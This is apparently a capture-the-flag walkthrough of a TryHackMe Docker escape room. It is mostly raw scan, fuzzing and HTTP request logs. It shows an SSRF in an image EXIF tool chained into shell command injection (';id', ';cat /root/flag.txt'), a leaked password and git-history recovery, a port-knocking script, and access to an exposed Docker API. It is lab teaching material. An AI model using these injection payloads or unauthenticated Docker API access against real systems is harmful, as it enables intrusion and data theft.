----
Our devs have created an awesome new site. Can you break out of the sandbox?
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/8fef301c6d66f1be947d7fc735486124.png)

### Introduction

 Start Machine

If you're Stuck with the Docker Breakout part of this challenge, use the "[Docker Rodeo](https://tryhackme.com/room/dockerrodeo)" room to learn a wide variety of Docker vulnerabilities.  

Answer the questions below

Deploy the VM  

Question Done

### A Simple Webapp

Start off with a simple webapp. Can you find the hidden flag?  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.141.57 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.141.57:22
Open 10.10.141.57:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-07 13:40 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:40
Completed Parallel DNS resolution of 1 host. at 13:40, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:40
Scanning 10.10.141.57 [2 ports]
Discovered open port 80/tcp on 10.10.141.57
Discovered open port 22/tcp on 10.10.141.57
Completed Connect Scan at 13:40, 0.20s elapsed (2 total ports)
Initiating Service scan at 13:40
Scanning 2 services on 10.10.141.57
Completed Service scan at 13:43, 162.02s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.141.57.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:43
Completed NSE at 13:43, 26.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:43
Completed NSE at 13:43, 2.98s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:43
Completed NSE at 13:43, 0.00s elapsed
Nmap scan report for 10.10.141.57
Host is up, received user-set (0.20s latency).
Scanned at 2023-04-07 13:40:17 EDT for 192s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh?    syn-ack
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  http    syn-ack nginx 1.19.6
|_http-title: docker-escape-nuxt
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-favicon: Unknown favicon MD5: 67EDB7D39E1376FDD8A24B0C640D781E
| http-robots.txt: 3 disallowed entries 
|_/api/ /exif-util /*.bak.txt$
|_http-server-header: nginx/1.19.6
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.93%I=7%D=4/7%Time=6430558D%P=x86_64-pc-linux-gnu%r(Gener
SF:icLines,4,"IR\r\n");

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:43
Completed NSE at 13:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:43
Completed NSE at 13:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:43
Completed NSE at 13:43, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 192.99 seconds

┌──(witty㉿kali)-[/tmp]
└─$ feroxbuster -u http://10.10.141.57/api/ -w /usr/share/wordlists/dirb/common.txt -k -t 64 -x php -s 200

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.141.57/api/
 🚀  Threads               │ 64
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
[####################] - 30s     9228/9228    0s      found:0       errors:0 

http://10.10.141.57/.well-known/security.txt

Hey you found me!

The security.txt file is made to help security researchers and ethical hackers to contact the company about security issues.

See https://securitytxt.org/ for more information.

Ping /api/fl46 with a HEAD request for a nifty treat.

┌──(witty㉿kali)-[/tmp]
└─$ curl -I http://10.10.141.57/api/fl46                                                   
HTTP/1.1 200 OK
Server: nginx/1.19.6
Date: Fri, 07 Apr 2023 18:18:01 GMT
Connection: keep-alive
flag: THM{b801135794bf1ed3a2aafaa44c2e5ad4}

The "curl -I" command is used to send a HEAD request to a web server and retrieve only the headers of the HTTP response, without the body. This can be useful for checking the response headers, such as the status code, content type, and caching information, without downloading the entire response.

HEAD /api/fl46 HTTP/1.1

HTTP/1.1 200 OK

Server: nginx/1.19.6

Date: Fri, 07 Apr 2023 18:20:54 GMT

Connection: close

flag: THM{b801135794bf1ed3a2aafaa44c2e5ad4}


```

Find the flag hidden in the webapp

Some well known files may offer some help

*THM{b801135794bf1ed3a2aafaa44c2e5ad4}*

### Root! Root?

There's a flag hidden by root on one of the machines. Can you find it?  

Answer the questions below

```
http://10.10.141.57/exif-util/

uploading an img

        EXIF:
----------------------
[JPEG] Compression Type - Baseline
[JPEG] Data Precision - 8 bits
[JPEG] Image Height - 533 pixels
[JPEG] Image Width - 800 pixels
[JPEG] Number of Components - 3
[JPEG] Component 1 - Y component: Quantization table 0, Sampling factors 2 horiz/2 vert
[JPEG] Component 2 - Cb component: Quantization table 1, Sampling factors 1 horiz/1 vert
[JPEG] Component 3 - Cr component: Quantization table 1, Sampling factors 1 horiz/1 vert
[JFIF] Version - 1.1
[JFIF] Resolution Units - none
[JFIF] X Resolution - 1 dot
[JFIF] Y Resolution - 1 dot
[JFIF] Thumbnail Width Pixels - 0
[JFIF] Thumbnail Height Pixels - 0
[ICC Profile] Profile Size - 524
[ICC Profile] CMM Type - lcms
[ICC Profile] Version - 2.1.0
[ICC Profile] Class - Display Device
[ICC Profile] Color space - RGB 
[ICC Profile] Profile Connection Space - XYZ 
[ICC Profile] Profile Date/Time - 2012:01:25 03:41:57
[ICC Profile] Signature - acsp
[ICC Profile] Primary Platform - Apple Computer, Inc.
[ICC Profile] XYZ values - 0.964 1 0.825
[ICC Profile] Tag Count - 10
[ICC Profile] Profile Description - c2
[ICC Profile] Profile Copyright - FB
[ICC Profile] Media White Point - (0.9642, 1, 0.8249)
[ICC Profile] Media Black Point - (0.0121, 0.0125, 0.0103)
[ICC Profile] Red Colorant - (0.4361, 0.2225, 0.0139)
[ICC Profile] Green Colorant - (0.3851, 0.7169, 0.0971)
[ICC Profile] Blue Colorant - (0.1431, 0.0606, 0.7141)
[ICC Profile] Red TRC - 0.0, 0.0030976, 0.0069734, 0.0132296, 0.0217594, 0.0328832, 0.0467231, 0.0634623, 0.0832685, 0.1062638, 0.1325856, 0.162356, 0.1956817, 0.2327001, 0.273518, 0.3182269, 0.3669032, 0.4196841, 0.4766461, 0.5378653, 0.6034638, 0.6734874, 0.7480125, 0.8272068, 0.9109026, 1.0
[ICC Profile] Green TRC - 0.0, 0.0030976, 0.0069734, 0.0132296, 0.0217594, 0.0328832, 0.0467231, 0.0634623, 0.0832685, 0.1062638, 0.1325856, 0.162356, 0.1956817, 0.2327001, 0.273518, 0.3182269, 0.3669032, 0.4196841, 0.4766461, 0.5378653, 0.6034638, 0.6734874, 0.7480125, 0.8272068, 0.9109026, 1.0
[ICC Profile] Blue TRC - 0.0, 0.0030976, 0.0069734, 0.0132296, 0.0217594, 0.0328832, 0.0467231, 0.0634623, 0.0832685, 0.1062638, 0.1325856, 0.162356, 0.1956817, 0.2327001, 0.273518, 0.3182269, 0.3669032, 0.4196841, 0.4766461, 0.5378653, 0.6034638, 0.6734874, 0.7480125, 0.8272068, 0.9109026, 1.0
[Huffman] Number of Tables - 4 Huffman tables
[File Type] Detected File Type Name - JPEG
[File Type] Detected File Type Long Name - Joint Photographic Experts Group
[File Type] Detected MIME Type - image/jpeg
[File Type] Expected File Name Extension - jpg
[File] File Name - pfx4603328967788719562sfx
[File] File Size - 42663 bytes
[File] File Modified Date - Fri Apr 07 18:28:02 +00:00 2023

XMP:
----------------------

using url

┌──(witty㉿kali)-[~/Downloads]
└─$ file filekoth 
filekoth: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 1350x900, components 3


┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234       
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.141.57 - - [07/Apr/2023 14:31:13] "GET /filekoth HTTP/1.1" 200 -

http://10.8.19.103:1234/filekoth

        EXIF:
----------------------
[JPEG] Compression Type - Baseline
[JPEG] Data Precision - 8 bits
[JPEG] Image Height - 900 pixels
[JPEG] Image Width - 1350 pixels
[JPEG] Number of Components - 3
[JPEG] Component 1 - Y component: Quantization table 0, Sampling factors 2 horiz/2 vert
[JPEG] Component 2 - Cb component: Quantization table 1, Sampling factors 1 horiz/1 vert
[JPEG] Component 3 - Cr component: Quantization table 1, Sampling factors 1 horiz/1 vert
[JFIF] Version - 1.1
[JFIF] Resolution Units - inch
[JFIF] X Resolution - 72 dots
[JFIF] Y Resolution - 72 dots
[JFIF] Thumbnail Width Pixels - 0
[JFIF] Thumbnail Height Pixels - 0
[Huffman] Number of Tables - 4 Huffman tables
[File Type] Detected File Type Name - JPEG
[File Type] Detected File Type Long Name - Joint Photographic Experts Group
[File Type] Detected MIME Type - image/jpeg
[File Type] Expected File Name Extension - jpg

XMP:
----------------------

GET /api/exif?url=http:%2F%2F10.8.19.103:1234%2Ffilekoth HTTP/1.1

SSRF

HTTP/1.1 200 OK

Server: nginx/1.19.6

Date: Fri, 07 Apr 2023 18:31:15 GMT

Content-Type: text/plain;charset=UTF-8

Content-Length: 925

Connection: close



EXIF:
----------------------
[JPEG] Compression Type - Baseline
[JPEG] Data Precision - 8 bits
[JPEG] Image Height - 900 pixels
[JPEG] Image Width - 1350 pixels
[JPEG] Number of Components - 3
[JPEG] Component 1 - Y component: Quantization table 0, Sampling factors 2 horiz/2 vert
[JPEG] Component 2 - Cb component: Quantization table 1, Sampling factors 1 horiz/1 vert
[JPEG] Component 3 - Cr component: Quantization table 1, Sampling factors 1 horiz/1 vert
[JFIF] Version - 1.1
[JFIF] Resolution Units - inch
[JFIF] X Resolution - 72 dots
[JFIF] Y Resolution - 72 dots
[JFIF] Thumbnail Width Pixels - 0
[JFIF] Thumbnail Height Pixels - 0
[Huffman] Number of Tables - 4 Huffman tables
[File Type] Detected File Type Name - JPEG
[File Type] Detected File Type Long Name - Joint Photographic Experts Group
[File Type] Detected MIME Type - image/jpeg
[File Type] Expected File Name Extension - jpg

XMP:
----------------------

send to repeater

GET /api/exif?url=http://127.0.0.1:8080 HTTP/1.1

HTTP/1.1 200 OK

Server: nginx/1.19.6

Date: Fri, 07 Apr 2023 18:39:24 GMT

Content-Type: text/plain;charset=UTF-8

Content-Length: 342

Connection: close



An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Nothing to see here</title>
</head>
<body>

<p>Nothing to see here, move along...</p>

</body>
</html>

trying with port 22,80 and 8080

creating a wordlist to get /*.bak.txt$

┌──(witty㉿kali)-[~/Downloads]
└─$ cewl http://10.10.85.253 -d 5 -o           
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
docker
escape
nuxt
Loading

uhmm manually

┌──(witty㉿kali)-[/tmp]
└─$ nano wordlist-man
                                                                                                 
┌──(witty㉿kali)-[/tmp]
└─$ cat wordlist-man 
login
users
user
photo
image
sign-up
signup
Signup
SignUp
test
courses
username
user
admin
photos
images
exif-util
classroom
class
course
photos

┌──(witty㉿kali)-[/tmp]
└─$ wfuzz -u http://10.10.85.253/FUZZ.bak.txt -w /tmp/wordlist-man --hc 404,503 --hh 3834
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.85.253/FUZZ.bak.txt
Total requests: 21

=====================================================================
ID           Response   Lines    Word       Chars       Payload                         
=====================================================================

000000017:   200        64 L     125 W      1479 Ch     "exif-util"                     

Total time: 9.437551
Processed Requests: 21
Filtered Requests: 20
Requests/sec.: 2.225153

http://10.10.85.253/exif-util.bak.txt

<template>
  <section>
    <div class="container">
      <h1 class="title">Exif Utils</h1>
      <section>
        <form @submit.prevent="submitUrl" name="submitUrl">
          <b-field grouped label="Enter a URL to an image">
            <b-input
              placeholder="http://..."
              expanded
              v-model="url"
            ></b-input>
            <b-button native-type="submit" type="is-dark">
              Submit
            </b-button>
          </b-field>
        </form>
      </section>
      <section v-if="hasResponse">
        <pre>
          {{ response }}
        </pre>
      </section>
    </div>
  </section>
</template>

<script>
export default {
  name: 'Exif Util',
  auth: false,
  data() {
    return {
      hasResponse: false,
      response: '',
      url: '',
    }
  },
  methods: {
    async submitUrl() {
      this.hasResponse = false
      console.log('Submitted URL')
      try {
        const response = await this.$axios.$get('http://api-dev-backup:8080/exif', {
          params: {
            url: this.url,
          },
        })
        this.hasResponse = true
        this.response = response
      } catch (err) {
        console.log(err)
        this.$buefy.notification.open({
          duration: 4000,
          message: 'Something bad happened, please verify that the URL is valid',
          type: 'is-danger',
          position: 'is-top',
          hasIcon: true,
        })
      }
    },
  },
}
</script>

GET /api/exif?url=http://api-dev-backup:8080/exif HTTP/1.1

Server: nginx/1.19.6

Date: Fri, 07 Apr 2023 20:04:19 GMT

Content-Type: text/plain;charset=UTF-8

Content-Length: 3287

Connection: close



An error occurred: HTTP Exception 500 Internal Server Error
                Response was:
                ---------------------------------------
                <-- 500 http://api-dev-backup:8080/exif
Response : Internal Server Error

GET /api/exif?url=http://api-dev-backup:8080/exif?url=;whoami HTTP/1.1

HTTP/1.1 200 OK

Server: nginx/1.19.6

Date: Fri, 07 Apr 2023 20:06:26 GMT

Content-Type: text/plain;charset=UTF-8

Content-Length: 414

Connection: close



An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
root

GET /api/exif?url=http://api-dev-backup:8080/exif?url=;id HTTP/1.1

uid=0(root) gid=0(root) groups=0(root)

cannot get a revshell doing manually 

GET /api/exif?url=http://api-dev-backup:8080/exif?url=;ls+-lah+/root HTTP/1.1

total 28K
drwx------ 1 root root 4.0K Jan  7  2021 .
drwxr-xr-x 1 root root 4.0K Jan  7  2021 ..
lrwxrwxrwx 1 root root    9 Jan  6  2021 .bash_history -> /dev/null
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 1 root root 4.0K Jan  7  2021 .git
-rw-r--r-- 1 root root   53 Jan  6  2021 .gitconfig
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-rw-r-- 1 root root  201 Jan  7  2021 dev-note.txt

GET /api/exif?url=http://api-dev-backup:8080/exif?url=;cat+/root/dev-note.txt HTTP/1.1

Hey guys,

Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff.

Anyways, the password is fluffybunnies123

Cheers,

Hydra

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh hydra@10.10.85.253 -v
OpenSSH_9.2p1 Debian-2, OpenSSL 3.0.8 7 Feb 2023
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug1: Connecting to 10.10.85.253 [10.10.85.253] port 22.
debug1: Connection established.
debug1: identity file /home/witty/.ssh/id_rsa type 0
debug1: identity file /home/witty/.ssh/id_rsa-cert type -1
debug1: identity file /home/witty/.ssh/id_ecdsa type -1
debug1: identity file /home/witty/.ssh/id_ecdsa-cert type -1
debug1: identity file /home/witty/.ssh/id_ecdsa_sk type -1
debug1: identity file /home/witty/.ssh/id_ecdsa_sk-cert type -1
debug1: identity file /home/witty/.ssh/id_ed25519 type -1
debug1: identity file /home/witty/.ssh/id_ed25519-cert type -1
debug1: identity file /home/witty/.ssh/id_ed25519_sk type -1
debug1: identity file /home/witty/.ssh/id_ed25519_sk-cert type -1
debug1: identity file /home/witty/.ssh/id_xmss type -1
debug1: identity file /home/witty/.ssh/id_xmss-cert type -1
debug1: identity file /home/witty/.ssh/id_dsa type -1
debug1: identity file /home/witty/.ssh/id_dsa-cert type -1
debug1: Local version string SSH-2.0-OpenSSH_9.2p1 Debian-2
debug1: kex_exchange_identification: banner line 0:  heQiE7 ]:{F
debug1: kex_exchange_identification: banner line 1: {

uhmm

https://github.com/skeeto/endlessh

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -v  http://10.10.85.253/api/login -d '{"username"\:"hydra","password"\:"fluffybunnies123"}'                                    
*   Trying 10.10.85.253:80...
* Connected to 10.10.85.253 (10.10.85.253) port 80 (#0)
> POST /api/login HTTP/1.1
> Host: 10.10.85.253
> User-Agent: curl/7.87.0
> Accept: */*
> Content-Length: 52
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 415 Unsupported Media Type
< Server: nginx/1.19.6
< Date: Fri, 07 Apr 2023 20:18:26 GMT
< Content-Length: 0
< Connection: keep-alive
< 
* Connection #0 to host 10.10.85.253 left intact

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -v  http://10.10.85.253/api/login -d '{"username"\:"hydra","password"\:"fluffybunnies123"}' -H "Content-Type: application/json"
*   Trying 10.10.85.253:80...
* Connected to 10.10.85.253 (10.10.85.253) port 80 (#0)
> POST /api/login HTTP/1.1
> Host: 10.10.85.253
> User-Agent: curl/7.87.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 52
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 Unauthorized
< Server: nginx/1.19.6
< Date: Fri, 07 Apr 2023 20:18:57 GMT
< Content-Type: application/json
< Content-Length: 72
< Connection: keep-alive
< 
{
    "status": "ERROR",
    "message": "Invalid Username or Password"
* Connection #0 to host 10.10.85.253 left intact
}  

GET /api/exif?url=http://api-dev-backup:8080/exif?url=;cd+/root;git+log HTTP/1.1

commit 5242825dfd6b96819f65d17a1c31a99fea4ffb6a
Author: Hydra <hydragyrum@example.com>
Date:   Thu Jan 7 16:48:58 2021 +0000

    fixed the dev note

commit 4530ff7f56b215fa9fe76c4d7cc1319960c4e539
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Removed the flag and original dev note b/c Security

commit a3d30a7d0510dc6565ff9316e3fb84434916dee8
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Added the flag and dev notes

GET /api/exif?url=http://api-dev-backup:8080/exif?url=;cd+/root;git+checkout+5242825dfd6b96819f65d17a1c31a99fea4ffb6a HTTP/1.1

Note: checking out '5242825dfd6b96819f65d17a1c31a99fea4ffb6a'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by performing another checkout.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -b with the checkout command again. Example:

  git checkout -b <new-branch-name>

HEAD is now at 5242825 fixed the dev note

GET /api/exif?url=http://api-dev-backup:8080/exif?url=;cd+/root;git+checkout+4530ff7f56b215fa9fe76c4d7cc1319960c4e539 HTTP/1.1

Previous HEAD position was 5242825 fixed the dev note
HEAD is now at 4530ff7 Removed the flag and original dev note b/c Security

GET /api/exif?url=http://api-dev-backup:8080/exif?url=;cd+/root;git+checkout+a3d30a7d0510dc6565ff9316e3fb84434916dee8 HTTP/1.1

Previous HEAD position was 4530ff7 Removed the flag and original dev note b/c Security
HEAD is now at a3d30a7 Added the flag and dev notes

GET /api/exif?url=http://api-dev-backup:8080/exif?url=;cat+/root/flag.txt HTTP/1.1

THM{0cb4b947043cb5c0486a454b75a10876}

GET /api/exif?url=http://api-dev-backup:8080/exif?url=;cat+/root/dev-note.txt HTTP/1.1

Hey guys,

I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin.

Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.

Cheers,

Hydra

```

Find the root flag?

Silly devs leaving their backups lying around...

*THM{0cb4b947043cb5c0486a454b75a10876}*


### The Great Escape

You thought you had root. But the root on a docker container isn't all that helpful. Find the secret flag  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ cat knock_port.sh
#! /bin/bash

curl http://10.10.85.253:42 -m 1
sleep 1
curl http://10.10.85.253:1337 -m 1
sleep 1
curl http://10.10.85.253:10420 -m 1
sleep 1
curl http://10.10.85.253:6969 -m 1
sleep 1
curl http://10.10.85.253:63000 -m 1

┌──(witty㉿kali)-[~/Downloads]
└─$ man curl | grep '\--max-time'
              See also -m, --max-time.
              See also -m, --max-time and --connect-timeout. Added in 7.59.0.
              See also --no-keepalive and -m, --max-time.
       -m, --max-time <fractional seconds>
              If -m, --max-time is provided several times, the last set value will be used.
               curl --max-time 10 https://example.com
               curl --max-time 2.92 https://example.com
              single request's maximum time, use -m, --max-time. Set this option  to  zero  to
              See also -y, --speed-time, --limit-rate and -m, --max-time.

┌──(witty㉿kali)-[~/Downloads]
└─$ bash knock_port.sh 
curl: (7) Failed to connect to 10.10.85.253 port 42 after 197 ms: Couldn't connect to server
curl: (7) Failed to connect to 10.10.85.253 port 1337 after 197 ms: Couldn't connect to server
curl: (7) Failed to connect to 10.10.85.253 port 10420 after 203 ms: Couldn't connect to server
curl: (7) Failed to connect to 10.10.85.253 port 6969 after 200 ms: Couldn't connect to server
curl: (7) Failed to connect to 10.10.85.253 port 63000 after 219 ms: Couldn't connect to server

┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.85.253 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.85.253:22
Open 10.10.85.253:80
Open 10.10.85.253:2375
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-07 16:34 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 16:34
Completed Parallel DNS resolution of 1 host. at 16:34, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:34
Scanning 10.10.85.253 [3 ports]
Discovered open port 80/tcp on 10.10.85.253
Discovered open port 22/tcp on 10.10.85.253
Discovered open port 2375/tcp on 10.10.85.253
Completed Connect Scan at 16:34, 0.20s elapsed (3 total ports)
Initiating Service scan at 16:34
Scanning 3 services on 10.10.85.253
Completed Service scan at 16:37, 162.04s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.85.253.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:37
Completed NSE at 16:37, 26.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:37
Completed NSE at 16:37, 3.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:37
Completed NSE at 16:37, 0.00s elapsed
Nmap scan report for 10.10.85.253
Host is up, received user-set (0.19s latency).
Scanned at 2023-04-07 16:34:27 EDT for 192s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh?    syn-ack
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines: 
|_    M|[nPeZ'A
80/tcp   open  http    syn-ack nginx 1.19.6
|_http-title: docker-escape-nuxt
|_http-server-header: nginx/1.19.6
|_http-favicon: Unknown favicon MD5: 67EDB7D39E1376FDD8A24B0C640D781E
| http-robots.txt: 3 disallowed entries 
|_/api/ /exif-util /*.bak.txt$
| http-methods: 
|_  Supported Methods: GET HEAD
2375/tcp open  docker  syn-ack Docker 20.10.2 (API 1.41)
| docker-version: 
|   KernelVersion: 4.15.0-130-generic
|   ApiVersion: 1.41
|   Version: 20.10.2
|   MinAPIVersion: 1.12
|   Platform: 
|     Name: Docker Engine - Community
|   Os: linux
|   Arch: amd64
|   Components: 
|     
|       Details: 
|         KernelVersion: 4.15.0-130-generic
|         Experimental: false
|         MinAPIVersion: 1.12
|         GitCommit: 8891c58
|         GoVersion: go1.13.15
|         Arch: amd64
|         Os: linux
|         BuildTime: 2020-12-28T16:15:09.000000000+00:00
|         ApiVersion: 1.41
|       Name: Engine
|       Version: 20.10.2
|     
|       Details: 
|         GitCommit: 269548fa27e0089a8b8278fc4fc781d7f65a939b
|       Name: containerd
|       Version: 1.4.3
|     
|       Details: 
|         GitCommit: ff819c7e9184c13b7c2607fe6c30ae19403a7aff
|       Name: runc
|       Version: 1.0.0-rc92
|     
|       Details: 
|         GitCommit: de40ad0
|       Name: docker-init
|       Version: 0.19.0
|   GoVersion: go1.13.15
|   BuildTime: 2020-12-28T16:15:09.000000000+00:00
|_  GitCommit: 8891c58
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.93%I=7%D=4/7%Time=64307E5F%P=x86_64-pc-linux-gnu%r(Gener
SF:icLines,B,"M\|\[nPeZ'A\r\n");
Service Info: OS: linux

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:37
Completed NSE at 16:37, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:37
Completed NSE at 16:37, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:37
Completed NSE at 16:37, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 196.91 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ docker -H 10.10.85.253:2375 ps
CONTAINER ID   IMAGE          COMMAND                  CREATED       STATUS       PORTS                  NAMES
49fe455a9681   frontend       "/docker-entrypoint.…"   2 years ago   Up 2 hours   0.0.0.0:80->80/tcp     dockerescapecompose_frontend_1
4b51f5742aad   exif-api-dev   "./application -Dqua…"   2 years ago   Up 2 hours                          dockerescapecompose_api-dev-backup_1
cb83912607b9   exif-api       "./application -Dqua…"   2 years ago   Up 2 hours   8080/tcp               dockerescapecompose_api_1
548b701caa56   endlessh       "/endlessh -v"           2 years ago   Up 2 hours   0.0.0.0:22->2222/tcp   dockerescapecompose_endlessh_1

┌──(witty㉿kali)-[~/Downloads]
└─$ docker -H 10.10.85.253:2375 images
REPOSITORY                                    TAG       IMAGE ID       CREATED       SIZE
exif-api-dev                                  latest    4084cb55e1c7   2 years ago   214MB
exif-api                                      latest    923c5821b907   2 years ago   163MB
frontend                                      latest    577f9da1362e   2 years ago   138MB
endlessh                                      latest    7bde5182dc5e   2 years ago   5.67MB
nginx                                         latest    ae2feff98a0c   2 years ago   133MB
